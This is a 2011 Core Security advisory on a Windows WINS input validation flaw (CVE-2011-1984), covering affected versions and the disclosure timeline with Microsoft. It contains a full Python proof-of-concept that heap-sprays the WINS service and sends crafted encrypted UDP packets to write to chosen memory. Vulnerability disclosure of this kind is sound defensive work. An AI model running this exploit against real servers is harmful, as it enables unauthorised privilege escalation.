@@ -1,0 +1,351 @@
+Core Security - Corelabs Advisory
+http://corelabs.coresecurity.com/
+
+MS WINS ECommEndDlg Input Validation Error
+
+
+1. *Advisory Information*
+
+Title: MS WINS ECommEndDlg Input Validation Error
+Advisory ID: CORE-2011-0526
+Advisory URL:
+http://www.coresecurity.com/content/ms-wins-ecommenddlg-input-validation
+Date published: 2011-09-12
+Date of last update: 2011-09-12
+Vendors contacted: Microsoft
+Release mode: Forced release
+
+
+2. *Vulnerability Information*
+
+Class: Input validation error [CWE-20]
+Impact: Code execution
+Remotely Exploitable: No
+Locally Exploitable: Yes
+CVE Name: CVE-2011-1984
+
+
+3. *Vulnerability Description*
+
+A security vulnerability was discovered in the Windows Internet Name
+Service (WINS). The vulnerability could allow elevation of privilege if
+a user receives a specially crafted WINS replication packet on an
+affected system running the WINS service. An attacker must have valid
+logon credentials and be able to log on locally in order to exploit this
+vulnerability.
+
+Malicious packets are processed by the vulnerable function
+'ECommEndDlg', reported in MS11-035 [1], but this time the pointers
+handled by this function are controlled by the attacker.
+
+*Important:* Given that this vulnerability is triggered by sending a
+specially crafted packet to the dynamic UDP port of the WINS service
+(which is binded to the loopback address '127.0.0.1'), this
+vulnerability can result in an elevation of privilege. Despite that, in
+old W2003 SP0 systems, the dynamic UDP port is binded to the '0.0.0.0'
+address, allowing remote code execution.
+
+
+4. *Vulnerable packages*
+
+   . Windows Server 2003 SP0, SP1 and SP2.
+   . Windows Server 2003 x64 Edition SP2.
+   . Windows Server 2003 SP2 for Itanium-based Systems.
+   . Windows Server 2008 SP2.
+   . Windows Server 2008 x64 Edition SP2.
+   . Windows Server 2008 R2 for x64-based Systems.
+   . Other versions and platforms are probably affected too, but they
+were no checked.
+
+
+5. *Non-vulnerable packages*
+
+   . Windows XP SP3.
+   . Windows XP Professional x64 Edition SP2.
+   . Windows Vista SP2.
+   . Windows Vista x64 Edition SP2.
+   . Windows Server 2008 for Itanium-based Systems SP2.
+   . Windows 7.
+   . Windows 7 for x64-based Systems.
+   . Windows Server 2008 R2 for Itanium-based systems.
+
+
+6. *Credits*
+
+This vulnerability was discovered and researched by Nicolas Economou
+from Core Security Exploit Writers Team. The publication of this
+advisory was coordinated by Fernando Miranda from Core Security
+Advisories Team.
+
+
+7. *Technical Description / Proof of Concept Code*
+
+7.1. *Proof of Concept*
+
+The following PoC was tested on WINS 5.2.3790.4849, W2003 SP2. This
+Python code generates 300 TCP connections to the 42 port (the limit of
+active WINS connections), and sends an UDP packet to the dynamic port
+handled by WINS. The packet is processed by the vulnerable function
+'ECommEndDlg', reported in MS11-035 [1], but this time the pointers
+handled by this function are controlled by the attacker. As a result,
+this code increments +1 the memory address passed through the command
+line. For example, the memory address 0x10c00 is typically mapped in the
+WINS process and it can be used.
+
+/-----
+##
+
+import sys
+import socket
+import struct
+import time
+import os
+
+from ctypes import *
+from ctypes.wintypes import DWORD
+
+LocalFree = windll.kernel32.LocalFree
+CryptProtectData = windll.crypt32.CryptProtectData
+CryptUnprotectData = windll.crypt32.CryptUnprotectData
+memcpy = cdll.msvcrt.memcpy
+
+CRYPTPROTECT_LOCAL_MACHINE = 0x04
+
+class DATA_BLOB(Structure):
+     _fields_ = [("cbData", DWORD), ("pbData", POINTER(c_char))]
+
+
+def get_data(blob):
+     cbData = int(blob.cbData)
+     pbData = blob.pbData
+     buffer = c_buffer(cbData)
+     memcpy(buffer, pbData, cbData)
+     LocalFree(pbData);
+     return buffer.raw
+
+def Win32CryptProtectData(plain):
+     buffer = c_buffer(plain, len(plain))
+     iblob = DATA_BLOB(len(plain), buffer)
+     oblob = DATA_BLOB()
+     if CryptProtectData(byref(iblob), u"win32crypto.py", None, None,
+None, CRYPTPROTECT_LOCAL_MACHINE, byref(oblob)):
+         return get_data(oblob)
+     else:
+         return None
+
+def send_packet (sock, ip, port, message):
+    packet = ""
+    packet += message
+    sock.sendto(packet, (ip, port))
+
+################################################################################
+
+# Check args
+if len(sys.argv) != 4:
+    print "\nusage: python wins_poc.py wins_tcp_dynamic_port
+wins_udp_dynamic_port writeable_address(hex)"
+    print "\nNote: On Windows 2003, the udp dynamic port is the same
+number of the tcp port less one"
+    sys.exit(0)
+
+# Get ports dinamically
+tcp_dynamic_port = int(sys.argv[1])
+udp_dynamic_port = int(sys.argv[2])
+writeable_address = int(sys.argv[3], 16)
+
+# Target IP
+target_ip = "127.0.0.1"
+
+################################################################################
+
+# Create connections to do a heap spray
+rpc_connections = []
+for i in range(0, 1000):
+    try:
+        p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        p.connect((target_ip, tcp_dynamic_port))
+        rpc_connections += [p]
+    except Exception, e:
+        break
+
+# Struct that is validated by WINS
+magic_struct  = ""
+magic_struct += "a" * 0x0c
+magic_struct += struct.pack("I", writeable_address-0x14)
+magic_struct += struct.pack("I", 0)
+magic_struct += struct.pack("I", 4)
+magic_struct += "b" * (0x20-len(magic_struct))
+magic_struct += struct.pack("I", 1)
+magic_struct += "c" * (0x2c-len(magic_struct))
+magic_struct += struct.pack("I", 0x10c00)
+magic_struct += "d" * (0x38-len(magic_struct))
+magic_struct += struct.pack("I", 0)
+
+# Data con la forma de la estructura que triggerea el bug
+data  = ""
+data += magic_struct
+data += "B" * (0x4000-len(data))
+data += "filling"
+
+# Create connections to do a heap spray
+for p in rpc_connections:
+    try:
+        p.send(data)
+    except Exception, e:
+        pass
+
+# Get to the limit od WINS connections
+print "connecting ..."
+ps = []
+for i in range(0, 300):
+    p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    p.connect((target_ip, 42))
+    ps += [p]
+
+# Go through an area 32Kb
+for offset in range(0, 0x8000, 4):
+    # Data to send
+    data  = ""
+    data += struct.pack("I", 0)
+    data += "A" * 0x0c
+    data += struct.pack("I", 0)
+    data += struct.pack("I", 0x05000000+offset)
+
+    # Encrypt
+    data2 = Win32CryptProtectData(data)
+
+    # Send the poisoned packet
+    p = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    send_packet(p, target_ip, udp_dynamic_port, data2)
+    p.close ()
+
+# Close all sockects
+print "closing TCP connections ..."
+for p in ps:
+    p.close()
+
+for p in rpc_connections:
+    p.close()
+
+-----/
+
+
+8. *Report Timeline*
+
+. 2011-06-07:
+Core Security Technologies notifies the MSRC of the vulnerability,
+setting the estimated publication date of the advisory to July 5th,
+2011. Technical details sent to the vendor.
+
+. 2011-06-07:
+Vendor acknowledges receipt of the information and notifies the case
+11427 was opened for handling this report.
+
+. 2011-06-08:
+MSRC notifies they will not be able to meet the initial release schedule
+set in July. MSRC will contact Core with a tentative timeline as soon as
+the product team has reproduced the issue.
+
+. 2011-06-15:
+MSRC notifies that they have successfully reproduced this issue and can
+confirm the vulnerability results in an Elevation of Privilege instead
+of Remote Code Execution; the reason for this is that the dynamic UDP
+port that is opened only listens on the loopback address. Despite that,
+MSRC will still be issuing a Security Update.
+
+. 2011-06-17:
+MSRC notifies that they are currently planning the development of the
+fix. MSRC also notifies that they should have a good idea when a fix
+will be available in a week.
+
+. 2011-06-17:
+Core requests a status update and an estimated release date.
+
+. 2011-06-24:
+MSRC notifies they are currently targeting Sep 13th 2011 to release the
+security update.
+
+. 2011-07-06:
+Core agrees to reschedule the advisory to Sep 13th.
+
+. 2011-08-31:
+MSRC notifies they are still on track to release the update in September.
+
+. 2011-09-08:
+Core notifies that everything is ready for public disclosure next
+Tuesday 13th.
+
+. 2011-09-09:
+MSRC notifies that, by error, the bulletins were unintentionally
+published last night. MSRC has taken down the bulletins and is
+evaluating what next steps are needed to take prior to next Tuesdays.
+MSRC asks delay the Core advisory until next Tuesday.
+
+. 2011-09-09:
+Core confirms that RSS reports regarding the Microsoft Security Bulletin
+MS11-070 were leaked and the information is available in some security
+blogs and security discussion lists [2][3][4]. These leaked reports
+include the vulnerability reported by Core: "Vulnerability in WINS Could
+Allow Elevation of Privilege (2571621)".
+
+. 2011-09-09:
+Core notifies that advisories are not usually released on Fridays and
+announces that the advisory will be released Monday 12th.
+
+. 2011-09-12:
+CORE-2011-0526 is published as forced release.
+
+
+9. *References*
+
+[1] MS11-035,
+http://www.microsoft.com/technet/security/bulletin/ms11-035.mspx
+[2]
+http://arstechnica.com/microsoft/news/2011/09/microsoft-posts-security-bulletins-four-days-early-scrambles-to-fix-mistake.ars
+[3] http://www.smokey-services.eu/forums/index.php?topic=132827.0
+[4] http://pastebin.com/DT3w5G19
+
+
+10. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://corelabs.coresecurity.com.
+
+
+11. *About Core Security Technologies*
+
+Core Security Technologies enables organizations to get ahead of threats
+with security test and measurement solutions that continuously identify
+and prove real-world exposures to their most critical assets. Our
+customers can gain real visibility into their security standing, real
+validation of their security controls, and real metrics to more
+effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted
+research and leading-edge threat expertise from the company's Security
+Consulting Services, CoreLabs and Engineering groups. Core Security
+Technologies can be reached at +1 (617) 399-6980 or on the Web at:
+http://www.coresecurity.com.
+
+
+12. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2011 Core Security
+Technologies and (c) 2011 CoreLabs, and are licensed under a Creative
+Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
+License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+
+13. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
